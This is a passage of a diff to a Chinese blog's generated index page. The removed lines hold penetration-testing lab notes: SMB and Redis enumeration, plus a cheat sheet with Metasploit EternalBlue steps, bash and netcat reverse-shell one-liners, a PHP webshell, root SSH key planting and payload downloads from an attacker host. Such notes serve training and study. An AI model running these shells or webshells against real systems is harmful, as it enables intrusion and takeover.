-<blockquote>
-<ul>
-<li>ADMIN$ - Administrative shares are hidden network shares created by the Windows NT family of operating systems that allow system administrators to have remote access to every disk volume on a network-connected system. These shares may not be permanently deleted but may be disabled.</li>
-<li>C$ - Administrative share for the C:\ disk volume. This is where the operating system is hosted.</li>
-<li>IPC$ - The inter-process communication share. Used for inter-process communication via named pipes and is not part of the file system.</li>
-<li>WorkShares - Custom share.</li>
-</ul>
-</blockquote>
-<p>连接：</p>
-<p><code>smbclient \\\\ &#123;target_ip&#125;\\&#123;target_host&#125;</code></p>
-<blockquote>
-<p><code>smbsilent</code> 是一个工具，用于枚举 SMB 服务器共享和共享内的文件夹，其中：</p>
-<ul>
-<li><code>-N</code> 表示进行无认证的 SMB 网络浏览</li>
-<li><code>-L</code> 表示执行网络浏览（查看可用共享）</li>
-</ul>
-<p>而 <code>\\\\&#123;ip&#125;\\</code> 则是需要执行网络浏览的目标主机地址，其中 <code>ip</code> 是目标主机的 IP 地址。该命令用于枚举指定主机上的 SMB 共享。</p>
-</blockquote>
-<p>关于这些<code>\</code></p>
-<blockquote>
-<p>在Windows系统的命令行中，反斜杠 <code>\</code> 被用作转义字符，所以要在命令中输入反斜杠本身，需要使用两个反斜杠 <code>\\</code> 来转义。在这个命令中，输入的 <code>\\</code> 表示一个反斜杠字符。因此 <code>\\\\</code> 表示两个反斜杠字符，后面紧接着的 <code>&#123;ip&#125;</code> 是要替换成目标主机的 IP 地址。</p>
-</blockquote>
-<p>连接后的一些操作：</p>
-<blockquote>
-<p>ls : listing contents of the directories within the share<br>cd : changing current directories within the share<br>get : downloading the contents of the directories within the share<br>exit : exiting the smb shell</p>
-</blockquote>
-<h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis:"></a>Redis:</h3><p>​	Redis是一个开源的内存数据存储系统，也被称为数据结构服务器。它支持各种数据结构，如字符串、哈希表、列表、集合等，并提供了广泛的客户端支持，可用于多种编程语言。Redis可以用作数据库、缓存、消息代理和排行榜等应用。它以速度和灵活性著称，并具有很高的可用性和可扩展性。Redis也支持数据持久化，可以将数据写入磁盘以便于重启后恢复数据。</p>
-<p>下载 redis-cli:</p>
-<p><code>sudo apt install redis-tools</code></p>
-<p>用法：</p>
-<blockquote>
-<p>redis-cli –help<br>Usage: redis-cli [OPTIONS] [cmd [arg [arg …]]]<br> -h  Server hostname (default: 127.0.0.1).<br> -p  Server port (default: 6379).<br> -s  Server socket (overrides hostname and port).<br> -a  Password to use when connecting to the server.<br> -r  Execute specified command N times.<br> -i  When -r is used, waits  seconds per command.<br> It is possible to specify sub-second times like -i 0.1.<br> -n  Database number.<br> -x Read last argument from STDIN.<br> -d  Multi-bulk delimiter in for raw formatting (default: \n).<br> -c Enable cluster mode (follow -ASK and -MOVED redirections).<br> –raw Use raw formatting for replies (default when STDOUT is<br> not a tty).<br> –no-raw Force formatted output even when STDOUT is not a tty.<br> –csv Output in CSV format.<br> –stat Print rolling stats about server: mem, clients, …<br>In our case, we will only need to use the following switch for specifying the host that we need to connect to :<br>Let us connect to the redis server using the following command :<br>Upon a successful connection with the Redis server, we should be able to see a prompt in the terminal as<br>shown in the image above.<br>One of the basic Redis enumeration commands is info which returns information and statistics about the<br>Redis server. Since the output of this command is pretty long, I have snipped out the less-relevant<br>information :<br> –latency Enter a special mode continuously sampling latency.<br> –latency-history Like –latency but tracking latency changes over time.<br> Default time interval is 15 sec. Change it using -i.<br> –latency-dist Shows latency as a spectrum, requires xterm 256 colors.<br> Default time interval is 1 sec. Change it using -i.<br> –lru-test  Simulate a cache workload with an 80-20 distribution.<br> –slave Simulate a slave showing commands received from the master.<br> –rdb  Transfer an RDB dump from remote server to local file.<br> –pipe Transfer raw Redis protocol from stdin to server.<br> –pipe-timeout  In –pipe mode, abort with error if after sending all data.<br> no reply is received within  seconds.<br> Default timeout: 30. Use 0 to wait forever.<br> –bigkeys Sample Redis keys looking for big keys.<br> –scan List all keys using the SCAN command.<br> –pattern  Useful with –scan to specify a SCAN pattern.<br> –intrinsic-latency  Run a test to measure intrinsic system latency.<br> The test will run for the specified amount of seconds.<br> –eval  Send an EVAL command using the Lua script at .<br> –help Output this help and exit.<br> –version Output version and exit.</p>
-</blockquote>
-<p>连接：<code>redis-cli -h &#123;target_ip&#125;</code></p>
-<p>登录后的一些操作：</p>
-<p><code>info</code>:查看当前信息，在keysapce中可以看到存在的数据库及其索引</p>
-<p><code>select  &#123;index&#125;</code>:输入要选择进入的数据库索引号</p>
-<p><code>keys *</code>:列出数据库中的所有键</p>
-<p><code>get &lt;key&gt;</code> : 获取键对应的值</p>
-
+            
             
         </div>
     </div>
@@ -1673,7 +855,7 @@ Nmap done: 1 IP address (1 host up) scanned in 19.23 seconds
         
         <span class="tag">
             
-            <a href="/tags/靶场学习" style=color:#03a9f4>
+            <a href="/tags/靶场学习" style=color:#00bcd4>
                 靶场学习
             </a>
         </span>
@@ -1708,7 +890,6 @@ Nmap done: 1 IP address (1 host up) scanned in 19.23 seconds
 
     <div class="excerpt">
         <div class="content" v-pre>
-            
             
             <h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="备忘录"><a href="#备忘录" class="headerlink" title="备忘录"></a>备忘录</h2><h3 id="基本工具"><a href="#基本工具" class="headerlink" title="基本工具"></a>基本工具</h3><table>
 <thead>
@@ -1834,326 +1015,7 @@ Nmap done: 1 IP address (1 host up) scanned in 19.23 seconds
 <td>vim：写和退出</td>
 </tr>
 </tbody></table>
-<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><table>
-<thead>
-<tr>
-<th><strong>命令</strong></th>
-<th><strong>描述</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>服务扫描</strong></td>
-<td></td>
-</tr>
-<tr>
-<td><code>nmap 10.129.42.253</code></td>
-<td>在 IP 上运行 nmap</td>
-</tr>
-<tr>
-<td><code>nmap -sV -sC -p- 10.129.42.253</code></td>
-<td>在 IP 上运行 nmap 脚本扫描</td>
-</tr>
-<tr>
-<td><code>locate scripts/citrix</code></td>
-<td>列出各种可用的 nmap 脚本</td>
-</tr>
-<tr>
-<td><code>nmap --script smb-os-discovery.nse -p445 10.10.10.40</code></td>
-<td>在 IP 上运行 nmap 脚本</td>
-</tr>
-<tr>
-<td><code>netcat 10.10.10.10 22</code></td>
-<td>抓取开放端口的横幅</td>
-</tr>
-<tr>
-<td><code>smbclient -N -L \\\\10.129.42.253</code></td>
-<td>列出中小企业共享</td>
-</tr>
-<tr>
-<td><code>smbclient \\\\10.129.42.253\\users</code></td>
-<td>连接到 SMB 共享</td>
-</tr>
-<tr>
-<td><code>snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0</code></td>
-<td>扫描 IP 上的 SNMP</td>
-</tr>
-<tr>
-<td><code>onesixtyone -c dict.txt 10.129.42.254</code></td>
-<td>暴力破解 SNMP 机密字符串</td>
-</tr>
-<tr>
-<td><strong>网络枚举</strong></td>
-<td></td>
-</tr>
-<tr>
-<td><code>gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt</code></td>
-<td>在网站上运行目录扫描</td>
-</tr>
-<tr>
-<td><code>gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt</code></td>
-<td>在网站上运行子域扫描</td>
-</tr>
-<tr>
-<td><code>curl -IL https://www.inlanefreight.com</code></td>
-<td>抓取网站横幅</td>
-</tr>
-<tr>
-<td><code>whatweb 10.10.10.121</code></td>
-<td>列出有关 Web 服务器&#x2F;证书的详细信息</td>
-</tr>
-<tr>
-<td><code>curl 10.10.10.121/robots.txt</code></td>
-<td>列出潜在目录<code>robots.txt</code></td>
-</tr>
-<tr>
-<td><code>ctrl+U</code></td>
-<td>查看页面源代码（在火狐中）</td>
-</tr>
-<tr>
-<td><strong>公共漏洞利用</strong></td>
-<td></td>
-</tr>
-<tr>
-<td><code>searchsploit openssh 7.2</code></td>
-<td>搜索 Web 应用程序的公共漏洞</td>
-</tr>
-<tr>
-<td><code>msfconsole</code></td>
-<td>MSF：启动 Metasploit 框架</td>
-</tr>
-<tr>
-<td><code>search exploit eternalblue</code></td>
-<td>MSF：在 MSF 中搜索公共漏洞</td>
-</tr>
-<tr>
-<td><code>use exploit/windows/smb/ms17_010_psexec</code></td>
-<td>MSF：开始使用 MSF 模块</td>
-</tr>
-<tr>
-<td><code>show options</code></td>
-<td>MSF：显示 MSF 模块所需的选项</td>
-</tr>
-<tr>
-<td><code>set RHOSTS 10.10.10.40</code></td>
-<td>MSF：设置 MSF 模块选项的值</td>
-</tr>
-<tr>
-<td><code>check</code></td>
-<td>MSF：测试目标服务器是否易受攻击</td>
-</tr>
-<tr>
-<td><code>exploit</code></td>
-<td>MSF：在目标服务器上运行漏洞易受攻击</td>
-</tr>
-<tr>
-<td><strong>使用外壳</strong></td>
-<td></td>
-</tr>
-<tr>
-<td><code>nc -lvnp 1234</code></td>
-<td>在本地端口上启动侦听器<code>nc</code></td>
-</tr>
-<tr>
-<td><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1&#39;</code></td>
-<td>从远程服务器发送反向外壳</td>
-</tr>
-<tr>
-<td>&#96;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f</td>
-<td>&#x2F;bin&#x2F;sh -i 2&gt;&amp;1</td>
-</tr>
-<tr>
-<td>&#96;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f</td>
-<td>&#x2F;bin&#x2F;bash -i 2&gt;&amp;1</td>
-</tr>
-<tr>
-<td><code>nc 10.10.10.1 1234</code></td>
-<td>连接到远程服务器上启动的绑定外壳</td>
-</tr>
-<tr>
-<td><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></td>
-<td>升级外壳 TTY （1）</td>
-</tr>
-<tr>
-<td><code>ctrl+z</code>然后然后是两次<code>stty raw -echo``fg``enter</code></td>
-<td>升级外壳 TTY （2）</td>
-</tr>
-<tr>
-<td><code>echo &quot;&lt;?php system(\$_GET[&#39;cmd&#39;]);?&gt;&quot; &gt; /var/www/html/shell.php</code></td>
-<td>创建一个 webshell php 文件</td>
-</tr>
-<tr>
-<td><code>curl http://SERVER_IP:PORT/shell.php?cmd=id</code></td>
-<td>在上传的 Web 外壳上执行命令</td>
-</tr>
-<tr>
-<td><strong>权限提升</strong></td>
-<td></td>
-</tr>
-<tr>
-<td><code>./linpeas.sh</code></td>
-<td>运行脚本以枚举远程服务器<code>linpeas</code></td>
-</tr>
-<tr>
-<td><code>sudo -l</code></td>
-<td>列出可用权限<code>sudo</code></td>
-</tr>
-<tr>
-<td><code>sudo -u user /bin/echo Hello World!</code></td>
-<td>运行命令<code>sudo</code></td>
-</tr>
-<tr>
-<td><code>sudo su -</code></td>
-<td>切换到根用户（如果我们有权访问<code>sudo su</code>)</td>
-</tr>
-<tr>
-<td><code>sudo su user -</code></td>
-<td>切换到用户（如果我们有权访问<code>sudo su</code>)</td>
-</tr>
-<tr>
-<td><code>ssh-keygen -f key</code></td>
-<td>创建新的 SSH 密钥</td>
-</tr>
-<tr>
-<td><code>echo &quot;ssh-rsa AAAAB...SNIP...M= user@parrot&quot; &gt;&gt; /root/.ssh/authorized_keys</code></td>
-<td>将生成的公钥添加到用户</td>
-</tr>
-<tr>
-<td><code>ssh root@10.10.10.10 -i key</code></td>
-<td>使用生成的私钥通过 SSH 连接到服务器</td>
-</tr>
-<tr>
-<td><strong>传输文件</strong></td>
-<td></td>
-</tr>
-<tr>
-<td><code>python3 -m http.server 8000</code></td>
-<td>启动本地网络服务器</td>
-</tr>
-<tr>
-<td><code>wget http://10.10.14.1:8000/linpeas.sh</code></td>
-<td>从我们的本地计算机下载远程服务器上的文件</td>
-</tr>
-<tr>
-<td><code>curl http://10.10.14.1:8000/linenum.sh -o linenum.sh</code></td>
-<td>从我们的本地计算机下载远程服务器上的文件</td>
-</tr>
-<tr>
-<td><code>scp linenum.sh user@remotehost:/tmp/linenum.sh</code></td>
-<td>使用（需要 SSH 访问）将文件传输到远程服务器<code>scp</code></td>
-</tr>
-<tr>
-<td><code>base64 shell -w 0</code></td>
-<td>将文件转换为<code>base64</code></td>
-</tr>
-<tr>
-<td>&#96;echo f0VMR…SNIO…InmDwU</td>
-<td>base64 -d &gt; shell&#96;</td>
-</tr>
-<tr>
-<td><code>md5sum shell</code></td>
-<td>检查文件以确保其转换正确<code>md5sum</code></td>
-</tr>
-</tbody></table>
-<h3 id="网络枚举：gobuster"><a href="#网络枚举：gobuster" class="headerlink" title="网络枚举：gobuster"></a>网络枚举：gobuster</h3><p>发现 Web 应用程序后，始终值得检查一下我们是否可以在 Web 服务器上发现任何不用于公共访问的隐藏文件或目录。我们可以使用<a target="_blank" rel="noopener" href="https://github.com/ffuf/ffuf">ffuf</a>或<a target="_blank" rel="noopener" href="https://github.com/OJ/gobuster">GoBuster</a>之类的工具来执行此目录枚举。有时我们会发现隐藏的功能或页面&#x2F;目录暴露敏感数据，可以利用这些数据访问 Web 应用程序，甚至在 Web 服务器本身上远程执行代码。</p>
-<p>GoBuster是一个多功能工具，允许执行DNS，vhost和目录暴力强制。该工具具有其他功能，例如枚举公有 AWS S3 存储桶。出于本模块的目的，我们对使用 switch 指定的目录（和文件）暴力破解模式感兴趣。让我们使用单词列表运行一个简单的扫描。<code>dir``dirb``common.txt</code></p>
-<p>  目录&#x2F;文件枚举</p>
-<pre><code>Tanin@htb[/htb]$ gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt
-
-===============================================================
-Gobuster v3.0.1
-by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
-===============================================================
-[+] Url:            http://10.10.10.121/
-[+] Threads:        10
-[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
-[+] Status codes:   200,204,301,302,307,401,403
-[+] User Agent:     gobuster/3.0.1
-[+] Timeout:        10s
-===============================================================
-2020/12/11 21:47:25 Starting gobuster
-===============================================================
-/.hta (Status: 403)
-/.htpasswd (Status: 403)
-/.htaccess (Status: 403)
-/index.php (Status: 200)
-/server-status (Status: 403)
-/wordpress (Status: 301)
-===============================================================
-2020/12/11 21:47:46 Finished
-===============================================================
-</code></pre>
-<h4 id="DNS-子域枚举"><a href="#DNS-子域枚举" class="headerlink" title="DNS 子域枚举"></a>DNS 子域枚举</h4><p>子域上还可能托管基本资源，例如管理面板或具有可被利用的附加功能的应用程序。我们可以使用标志来枚举给定域的可用子域来指定 DNS 模式。首先，让我们克隆 SecLists GitHub <a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists">存储库</a>，其中包含许多用于模糊测试和利用的有用列表：<code>GoBuster``dns</code></p>
-<h4 id="安装安全列表"><a href="#安装安全列表" class="headerlink" title="安装安全列表"></a>安装安全列表</h4><p>  安装安全列表</p>
-<pre><code>Tanin@htb[/htb]$ git clone https://github.com/danielmiessler/SecLists
-</code></pre>
-<p>  安装安全列表</p>
-<pre><code>Tanin@htb[/htb]$ sudo apt install seclists -y
-</code></pre>
-<p>接下来，将 DNS 服务器（如 1.1.1.1）添加到文件中。我们将针对域名，虚构的货运和物流公司的网站。<code>/etc/resolv.conf``inlanefreight.com</code></p>
-<p>  安装安全列表</p>
-<pre><code>Tanin@htb[/htb]$ gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
-
-===============================================================
-Gobuster v3.0.1
-by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
-===============================================================
-[+] Domain:     inlanefreight.com
-[+] Threads:    10
-[+] Timeout:    1s
-[+] Wordlist:   /usr/share/SecLists/Discovery/DNS/namelist.txt
-===============================================================
-2020/12/17 23:08:55 Starting gobuster
-===============================================================
-Found: blog.inlanefreight.com
-Found: customer.inlanefreight.com
-Found: my.inlanefreight.com
-Found: ns1.inlanefreight.com
-Found: ns2.inlanefreight.com
-Found: ns3.inlanefreight.com
-===============================================================
-2020/12/17 23:10:34 Finished
-===============================================================
-</code></pre>
-<p>这次扫描揭示了几个有趣的子域，我们可以进一步检查。<a target="_blank" rel="noopener" href="https://academy.hackthebox.com/module/details/54">使用 Ffuf 攻击 Web 应用程序</a>模块详细介绍了 Web 枚举和模糊测试。</p>
-<h4 id="Whatweb"><a href="#Whatweb" class="headerlink" title="Whatweb"></a>Whatweb</h4><p>我们可以使用 命令行工具 .这些信息可以帮助我们查明正在使用的技术并开始搜索潜在的漏洞。<code>whatweb</code></p>
-<pre><code>Tanin@htb[/htb]$ whatweb 10.10.10.121
-
-http://10.10.10.121 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[license@php.net], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.121], Title[PHP 7.4.3 - phpinfo()]
-</code></pre>
-<p><code>Whatweb</code>是一个方便的工具，包含许多功能来自动执行网络上的 Web 应用程序枚举。</p>
-<pre><code>Tanin@htb[/htb]$ whatweb --no-errors 10.10.10.0/24
-
-http://10.10.10.11 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.1], IP[10.10.10.11], PoweredBy[Red,nginx], Title[Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux], nginx[1.14.1]
-http://10.10.10.100 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.100], Title[File Sharing Service]
-http://10.10.10.121 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[license@php.net], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.121], Title[PHP 7.4.3 - phpinfo()]
-http://10.10.10.247 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@cross-fit.htb], Frame, HTML5, HTTPServer[OpenBSD httpd], IP[10.10.10.247], JQuery[3.3.1], PHP[7.4.12], Script, Title[Fine Wines], X-Powered-By[PHP/7.4.12], X-UA-Compatible[ie=edge]
-</code></pre>
-<h2 id="查找公共漏洞"><a href="#查找公共漏洞" class="headerlink" title="查找公共漏洞"></a>查找公共漏洞</h2><p>许多工具可以帮助我们搜索在枚举阶段可能遇到的各种应用程序和服务的公共漏洞。一种方法是谷歌应用程序名称，看看我们是否得到任何结果：<code>exploit</code></p>
-<p>为此目的的一个众所周知的工具是 ，我们可以用来搜索任何应用程序的公共漏洞&#x2F;漏洞。我们可以用以下命令安装它：<code>searchsploit</code></p>
-<pre><code>Tanin@htb[/htb]$ sudo apt install exploitdb -y
-</code></pre>
-<pre><code>Tanin@htb[/htb]$ searchsploit openssh 7.2
-
------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
- Exploit Title                                                                                                               |  Path
------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
-OpenSSH 2.3 &lt; 7.7 - Username Enumeration                                                                                     | linux/remote/45233.py
-OpenSSH 2.3 &lt; 7.7 - Username Enumeration (PoC)                                                                               | linux/remote/45210.py
-OpenSSH 7.2 - Denial of Service                                                                                              | linux/dos/40888.py
-OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                                      | multiple/remote/39569.py
-OpenSSH 7.2p2 - Username Enumeration                                                                                         | linux/remote/40136.py
-OpenSSH &lt; 7.4 - &#39;UsePrivilegeSeparation Disabled&#39; Forwarded Unix Domain Sockets Privilege Escalation                         | linux/local/40962.txt
-OpenSSH &lt; 7.4 - agent Protocol Arbitrary Library Loading                                                                     | linux/remote/40963.txt
-OpenSSH &lt; 7.7 - User Enumeration (2)                                                                                         | linux/remote/45939.py
-OpenSSHd 7.2p2 - Username Enumeration                                                                                        | linux/remote/40113.txt
------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
-</code></pre>
-<h3 id="权限提升：LinEnum"><a href="#权限提升：LinEnum" class="headerlink" title="权限提升：LinEnum"></a>权限提升：LinEnum</h3><p> <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh">LinEnum.sh</a></p>
-<h3 id="HASH"><a href="#HASH" class="headerlink" title="HASH:"></a>HASH:</h3><ul>
-<li>hashcat</li>
-<li>CeWL</li>
-</ul>
-
+            
             
         </div>
     </div>
@@ -2167,7 +1029,7 @@ OpenSSHd 7.2p2 - Username Enumeration                                           
         
         <span class="tag">
             
-            <a href="/tags/tool" style=color:#00a596>
+            <a href="/tags/tool" style=color:#ff7d73>
                 tool
             </a>
         </span>
